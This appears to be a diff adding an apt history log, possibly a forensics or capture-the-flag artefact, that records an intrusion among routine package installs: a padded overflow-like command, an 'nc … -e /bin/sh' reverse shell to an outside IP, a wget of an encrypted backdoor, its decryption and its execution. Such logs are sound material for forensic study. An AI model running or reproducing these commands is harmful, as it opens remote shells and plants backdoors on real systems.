@@ -1,0 +1,44 @@
+Start-Date: 2020-03-29  03:17:21
+Commandline: apt upgrade
+Install: gcc-10-base:armhf (10-20200324-1, automatic), libapt-p>
+Upgrade: libdevmapper1.02.1:armhf (2:1.02.155-3, 2:1.02.167-1+b>
+End-Date: 2020-03-29  03:18:39
+
+Start-Date: 2020-03-29  03:27:43
+Commandline: apt install php
+Install: libssh2-1:armhf (1.8.0-2.1, automatic), libkrb5-3:armh>
+End-Date: 2020-03-29  03:30:50
+
+Start-Date: 2020-03-29  03:36:53
+Commandline: apt install git
+Install: libxdmcp6:armhf (1:1.1.2-3, automatic), git-man:armhf >
+End-Date: 2020-03-29  03:37:10
+
+Start-Date: 2020-03-29  03:40:40
+Commandline: AA/AA/AA/AA/AA/AA/AA/AA/AA/AA/AA/AA/
+Install: error, readline-common:armhf (8.0-4>
+End-Date: 2020-03-29  03:40:41
+
+Start-Date: 2020-03-29  03:46:25
+Commandline: nc 25.167.32.32 65535 -e /bin/sh
+End-Date: 2020-03-29  03:48:20
+
+Start-Date: 2020-03-29  03:51:57
+Commandline: apt install ccrypt
+End-Date: 2020-03-29  03:52:31
+
+Start-Date: 2020-03-29  03:53:15
+Commandline: wget 25.167.32.32:65532/backdoor.py.cpt
+End-Date: 2020-03-29  03:53:38
+
+Start-Date: 2020-03-29  03:54:01
+Commandline: ccrypt -d -K ******** backdoor.py.cpt
+End-Date: 2020-03-29  03:54:20
+
+Start-Date: 2020-03-29  03:56:45
+Commandline: ls
+End-Date: 2020-03-29  03:58:33
+
+Start-Date: 2020-03-29  03:58:14
+Commandline: python3 backdoor.py
+End-Date: 2020-03-29  03:58:33
